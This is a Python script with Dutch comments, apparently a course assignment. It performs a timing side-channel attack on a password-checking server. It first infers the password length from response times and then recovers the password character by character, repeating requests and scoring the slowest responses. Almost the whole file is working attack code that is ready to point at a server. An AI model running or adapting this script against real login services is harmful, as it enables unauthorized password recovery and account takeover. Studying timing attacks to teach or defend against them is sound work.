from client import call_server
from helper7 import warm_up
from helper6 import maak_set_van_lengte_aanvallen , maak_set_van_characters , maak_sub_wachtwoord, pas_sub_wachtwoord_aan
from helper5 import TimeList, Timing, ScoreBoard
import sys

#### find code at github
## https://github.com/dutchsilvester/timing.git


##### Dit is de uiteindelijke refactored opdracht file. Dit script zorgt voor een succesvolle aanval op de 
#### Initialisatie

user='000000'
samplesize=10
max_length=8
result_from_password_length_attack=0



#### Achterhalen van de lengte van het wachtwoord

# maak een set van cases voor het aanvallen
case_list=maak_set_van_lengte_aanvallen(samplesize=samplesize, max_length=max_length)

# ff opwarmen
warm_up()
## voor alle cases in de case list doen we een request. Deze slaan we op in een TimeList
results, time = call_server(user,case_list[0]*'t')

board=ScoreBoard()                                                          # init het scoreboard
while True:                                                                 # kom met een resultaat or die trying
    result_list  = TimeList(Timing(str(case_list[0]),time=time))            # warm up
    case_list=maak_set_van_lengte_aanvallen(samplesize=samplesize, max_length=max_length)
    for case in case_list:                                                  
        results, time = call_server(user,int(case)*'t')                     # maak request
        if results[0]!='I':                                                 # check of we wel het juiste aan het testen zijn ( [I]ncorrect wachtwoord )
            print(results)                                                  # als het foute boel is dan dump
            sys.exit()                                                      # and fall down crying
        result_list.add(Timing(str(case),time))                             # zet de meting in de lijst
        print(f"Aanval met lengte {case} ",end="\r")                        # doe maar iets van printen zodat de gebruiker denkt dat we aan ze denken
    print('')
    board.add(result_list.winner())                                         
    if board.do_we_have_a_winner():
        print(board.winner)
        result_from_password_length_attack=int(board.winner[0])             # int omdat het een lengte is, opgslagen als str in de lijst
        break                                                               # stop de while true loop als we een winnaar hebben
    print(str(board))
print("")
print(f"de gevonden lengte is {result_from_password_length_attack}")        ### yeah!! resultaat

#### Achterhalen van het wachtwoord                                         # here we go ... again

case_list=maak_set_van_characters(samplesize=samplesize)                    #init de caselist
sub_password=maak_sub_wachtwoord(max_length=result_from_password_length_attack)
for index in range(0,result_from_password_length_attack):
    board=ScoreBoard(min_rounds=5)                                              # init het scoreboard 5 rondes van 30 samples
    while True:                                                                 # kom met een resultaat or die trying
        result_list  = TimeList(Timing(case_list[0],time=0))
        case_list=maak_set_van_characters(samplesize=samplesize)                # blijf de sample lijst schudden voor gebruik random*random              
        for case in case_list:
            sub_password=pas_sub_wachtwoord_aan(index=index,wachtwoord=sub_password,character=case)
            results, time = call_server(user,"".join(sub_password))                     # maak request
            if results[0]=='P':
                print(results)
                print("".join(sub_password))
            if results[0]!="I":                                             # check op de juiste foutwaarde!!!
                print(results)
                sys.exit()
            print(f"Aanval met wachtwoord {"".join(sub_password)}",end="\r")
            result_list.add(Timing(character=case,time=time))
        print("")
        board.add(result_list.winner()) 
        if board.do_we_have_a_winner():
            print(board.winner)
            break                                                               # stop de while true loop als we een winnaar hebben
        print(str(board)+" "+board.status())
    print("")
    sub_password=pas_sub_wachtwoord_aan(index=index,wachtwoord=sub_password,character=board.winner[0])

print(sub_password)
